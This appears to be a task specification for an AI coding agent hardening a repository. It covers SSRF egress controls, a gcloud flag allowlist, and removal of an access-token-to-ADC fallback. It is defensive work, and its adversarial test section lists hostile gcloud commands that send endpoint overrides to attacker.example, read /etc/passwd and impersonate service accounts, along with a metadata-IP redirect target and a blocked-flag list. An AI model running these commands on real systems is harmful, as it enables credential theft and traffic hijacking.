# PHASE 3.1 — P3-01 CRITICAL SSRF & EGRESS SECURITY IMPLEMENTATION

## Mission

Implement and validate the complete P3-01 security remediation identified in:

`security_test_logs/phase_03_audit/PHASE_03_0_AUDIT.md`

Repository: `g-jsaccomani/pqc_inventory_agent`

Working branch:

`security-hardening/phase-03-runtime-resilience`

Baseline `main`:

`62f7247b52effc3f3cf2086a86f06071eea1b6fc`

This is a security-critical implementation. Prioritize correctness, tenant isolation, credential protection, and fail-closed behavior.

Do not implement P3-02, P3-03, P3-04, or P3-05 in this execution.

Do not deploy to GCP or modify production infrastructure.

---

## STAGE 0 — STRICT PRECONDITIONS

1. Verify repository identity.
2. Fetch remote references.
3. Checkout `security-hardening/phase-03-runtime-resilience`.
4. Verify `main` still contains baseline `62f7247b52effc3f3cf2086a86f06071eea1b6fc` as an ancestor.
5. Verify the branch contains the completed Phase 3.0 audit and test plan:
   - `security_test_logs/phase_03_audit/PHASE_03_0_AUDIT.md`
   - `security_test_logs/phase_03_audit/PHASE_03_0_TEST_PLAN.md`
6. Verify a clean working tree.
7. Inspect current implementations before changing anything:
   - `tools/gcloud_bridge.py`
   - `pqc_agent/workspace_server.py`
   - `pqc_agent/credential_service.py`
   - `pqc_agent/auth_guard.py`
   - Relevant authentication, OAuth, and gcloud tests.

Record the exact starting SHA.

STOP if the branch is missing, unexpectedly diverged, or contains uncommitted changes. Do not reset, force-push, amend, or rewrite commits.

Create:

`security_test_logs/phase_03_1_p3_01/EXECUTION_CHECKPOINT.md`

---

## STAGE 1 — CENTRALIZED SAFE OUTBOUND HTTP

Create:

`pqc_agent/egress_guard.py`

Implement a centralized `safe_urlopen()` abstraction.

### Mandatory security requirements

1. HTTPS only.
2. Exact hostname allowlist, initially restricted to the Google OAuth/OIDC endpoints actually used by the application:
   - `oauth2.googleapis.com`
   - `www.googleapis.com`
   - `openidconnect.googleapis.com`
   - `accounts.google.com`

Do not accept arbitrary subdomains or suffix-based hostname matches.

3. Reject:
   - HTTP URLs.
   - Userinfo in URLs.
   - Unexpected ports.
   - Malformed hostnames.
   - IP-literal destinations.
   - Loopback, private, link-local, multicast, reserved, unspecified, and metadata IP addresses.
   - Any destination outside the explicit hostname allowlist.

4. Disable HTTP redirects completely.

A redirect must fail closed. Never follow a 301, 302, 303, 307, or 308 response to another destination.

5. Enforce bounded response reads:
   - Default maximum: 64 KiB.
   - Reject oversized `Content-Length`.
   - Enforce the limit while streaming even if `Content-Length` is absent or false.
   - Do not return partial data as a successful response.

6. Require explicit finite timeouts.
7. Preserve TLS certificate verification.
8. Never log authorization headers, access tokens, refresh tokens, client secrets, or response bodies containing credentials.
9. Avoid DNS rebinding and validation/use discrepancies. The implementation must not validate one DNS resolution and then silently connect using an unrelated resolution. If the chosen standard-library implementation cannot guarantee this property, document the limitation and use a safer connection strategy or restrict the implementation to a demonstrably safe resolution path.
10. Keep the API small, typed, testable, and independent of FastAPI.

### Integration

Replace direct `urllib.request.urlopen()` calls in:
- `pqc_agent/workspace_server.py`
- `pqc_agent/credential_service.py`

Use `safe_urlopen()` with explicit endpoint policy and finite timeout values.

Inspect `pqc_agent/auth_guard.py` separately. If its Google JWKS retrieval uses a different HTTP transport, enforce equivalent hostname, redirect, timeout, TLS, and response-size protections without breaking Google authentication.

Do not perform a blind global replacement of every HTTP call in the repository.

Preserve existing OAuth, OIDC, PKCE, nonce, state, refresh-token rotation, and authentication behavior.

---

## STAGE 2 — STRICT GCLOUD COMMAND AND FLAG VALIDATION

Harden:

`tools/gcloud_bridge.py`

The current audit identified a critical flaw: `validate_gcloud_command()` validates non-flag verbs while allowing dangerous flags to bypass validation.

Replace this with structured parsing and explicit allowlists.

### 2.1 Command grammar

Validate:
- Executable must be `gcloud`.
- Allowed top-level service groups.
- Allowed command verbs and subcommands.
- Allowed flags for the specific command group.
- Flag values and their syntax.
- Repeated flags and `--flag=value` versus `--flag value` forms.

Do not validate commands by simply removing tokens beginning with `-`.

Do not introduce shell execution. Preserve `shell=False`.

### 2.2 Mandatory blocked flags

Unconditionally reject dangerous flags and equivalent property overrides, including:

- `--api-endpoint-overrides`
- `--property`
- `--impersonate-service-account`
- `--flags-file`
- `--credential-file-override`
- `--access-token-file`
- `--account`
- `--configuration`
- `--log-http`

Also reject:
- Any user-supplied HTTP/HTTPS endpoint URL in flag values.
- Attempts to inject additional gcloud configuration or endpoint overrides.
- Unknown flags.
- Flag aliases or alternate spellings that bypass the policy.

The policy must not rely exclusively on exact string matching if the same behavior can be reached through another accepted syntax.

### 2.3 Legitimate read-only commands

Preserve legitimate PQC inventory operations.

Use the Phase 3.0 audit as the baseline for legitimate command groups and flags.

Explicitly test representative read-only commands for:
- `kms`
- `asset`
- `compute ssl-policies`
- `privateca`

Support legitimate query flags only where required by actual application usage, including:
- `--project`
- `--location`
- `--region`
- `--zone`
- `--scope`
- `--organization`
- `--folder`
- `--keyring`
- `--key`
- `--asset-types`
- `--query`
- `--filter`
- `--format`
- `--limit`
- `--page-size`
- `--flatten`
- `--uri`
- `--global`
- `--quiet`

Do not blindly allow every listed flag for every command. Use command-specific policies.

Preserve existing read-only behavior and compatibility with the discovery and correlation agents.

### 2.4 Environment sanitization

Before `subprocess.run()`:
- Remove inherited `CLOUDSDK_API_ENDPOINT_OVERRIDES_*` variables.
- Remove unapproved proxy variables (`HTTP_PROXY`, `HTTPS_PROXY`, and lowercase equivalents).
- Do not inherit arbitrary environment configuration that can redirect authenticated traffic.
- Preserve only explicitly required environment variables.
- Do not log secrets.

Do not silently break required Cloud Run ADC behavior.

---

## STAGE 3 — REMOVE CONFUSED-DEPUTY TOKEN FALLBACK

In `execute_gcloud_command()`:

The audit identified a critical tenant-boundary problem.

When execution mode is `access_token`, a user `PERMISSION_DENIED` must never cause an automatic retry using the server's ADC credentials.

Implement:

1. `access_token` mode uses only the caller's delegated token.
2. A permission failure returns a controlled error.
3. No silent switch to server ADC.
4. No credential escalation.
5. ADC mode remains available only when explicitly selected through the existing trusted application flow.
6. Preserve the existing service-account impersonation allowlist in the trusted connection flow.
7. CLI and agent callers must not be able to override the authentication mode through untrusted arguments.

Add regression tests proving that a delegated-token failure produces zero ADC retry attempts.

---

## STAGE 4 — ADVERSARIAL AND REGRESSION TESTS

Create:

`tests/test_phase3_egress_security.py`

Use deterministic mocks. Do not contact attacker-controlled external endpoints.

### 4.1 Safe HTTP unit tests

Required tests:

- HTTPS Google allowlisted host accepted.
- HTTP rejected.
- Unknown hostname rejected.
- Suffix spoofing rejected (`oauth2.googleapis.com.attacker.example`).
- IP-literal URL rejected.
- Loopback and private destinations rejected.
- Link-local and metadata IP destinations rejected.
- Unexpected port rejected.
- URL userinfo rejected.
- Redirects rejected without following the second hop.
- Oversized `Content-Length` rejected.
- Oversized streamed response rejected.
- Missing `Content-Length` still enforces the byte limit.
- Missing timeout rejected.
- TLS verification remains enabled.
- Sensitive headers and tokens never appear in logs.

Include a specific redirect test targeting:

`http://169.254.169.254/computeMetadata/v1/`

Assert that the second destination is never contacted.

### 4.2 DNS and destination validation tests

Test:
- Public DNS resolution.
- Private IP resolution.
- Multiple DNS answers containing at least one prohibited address.
- DNS resolution errors.
- IPv4 and IPv6 edge cases.
- Validation/use consistency.

If DNS pinning or equivalent protection is implemented, test that the actual connection uses the validated destination.

### 4.3 Gcloud adversarial tests

Reject all of the following:

```text
gcloud kms keys list --location=global --api-endpoint-overrides=cloudkms=https://attacker.example/
gcloud kms keys list --location=global --property=api_endpoint_overrides/cloudkms=https://attacker.example/
gcloud kms keys list --flags-file=/etc/passwd
gcloud kms keys list --credential-file-override=/tmp/credentials.json
gcloud kms keys list --access-token-file=/tmp/token
gcloud kms keys list --impersonate-service-account=attacker@example.iam.gserviceaccount.com
gcloud kms keys list --log-http
```

Also test:
- Space-separated flag values.
- Equals-separated flag values.
- Repeated flags.
- Unknown flags.
- URL injection in values.
- Malformed command syntax.
- Attempts to change gcloud configuration.
- Environment variable endpoint override injection.

### 4.4 Legitimate command regression tests

Verify that representative valid read-only commands continue to pass validation.

Include KMS, Asset Inventory, Compute SSL Policies, and Private CA commands used by the application.

### 4.5 Confused-deputy tests

Test:
- User token succeeds: no ADC fallback.
- User token returns `PERMISSION_DENIED`: no ADC fallback.
- User token expires: no ADC fallback.
- Explicit trusted ADC mode still works.
- Untrusted caller cannot change the selected credential mode.

Assert exact invocation counts.

### 4.6 Existing suite

Run all relevant existing tests and the complete repository test suite.

Do not weaken or delete existing tests to achieve a passing result.

---

## STAGE 5 — SECURITY REVIEW AND IMPLEMENTATION QUALITY

Before declaring completion:

1. Review all changed code.
2. Search the repository for remaining direct `urlopen()` usages.
3. Search for remaining unsafe gcloud flag handling.
4. Search for any access-token-to-ADC fallback.
5. Verify no credential values are exposed in errors or logs.
6. Verify all new policies fail closed.
7. Verify OAuth and OIDC regression tests remain green.
8. Verify no new third-party dependency was introduced unless strictly necessary and explicitly justified.
9. Verify no unrelated files or Phase 1–2 historical evidence were changed.

If any outbound HTTP call remains outside the new guard, document its exact path, reason, and risk. Do not claim complete egress coverage.

---

## STAGE 6 — TEST EVIDENCE

Create detailed logs under:

`security_test_logs/phase_03_1_p3_01/`

Required files:

- `EXECUTION_CHECKPOINT.md`
- `TEST_RESULTS.md`
- `ADVERSARIAL_TESTS.md`
- `SECURITY_REVIEW.md`

Record:
- Exact starting SHA.
- Exact final SHA.
- Every changed file.
- Every test command.
- Test counts and exit codes.
- Skipped tests and reasons.
- Adversarial test outcomes.
- Any unresolved risks.
- Any validation blocked by environment limitations.

Do not fabricate test execution or claim a test passed if it was skipped.

---

## STAGE 7 — COMMIT

Before committing:

```bash
git status --short
git diff --check
git diff
git diff --cached
```

Verify that only P3-01 implementation, tests, and dedicated evidence files are staged.

Run the full suite again after the final code changes.

Create one focused commit:

`fix(security): harden outbound egress and gcloud execution`

Do not amend or rewrite existing commits.

Do not merge into `main`.

---

## HARD STOP CONDITIONS

Stop and report if:
- The current branch or baseline is unexpected.
- Existing legitimate gcloud operations cannot be safely distinguished from dangerous commands.
- A safe outbound HTTP implementation cannot guarantee the required destination controls.
- Any existing authentication or OAuth regression test fails.
- Any adversarial test demonstrates a bypass.
- A test failure is being hidden by a skip or weakened assertion.

Do not start P3-05 in this execution.

Do not implement circuit breakers, scorecard fixes, Docker changes, or upload validation.

Do not deploy to GCP.

## FINAL REPORT

Return:

1. P3-01 status: PASS / PARTIAL / BLOCKED.
2. Starting and final commit SHAs.
3. Files changed.
4. SSRF and redirect protection results.
5. Gcloud allowlist and adversarial test results.
6. Confirmation that user-token-to-ADC fallback was eliminated.
7. Full test counts and failures.
8. Remaining outbound HTTP exceptions.
9. Remaining security risks.
10. Exact next step: P3-05 upload hardening.

Security correctness is more important than implementation speed. Keep the change focused, auditable, and reversible.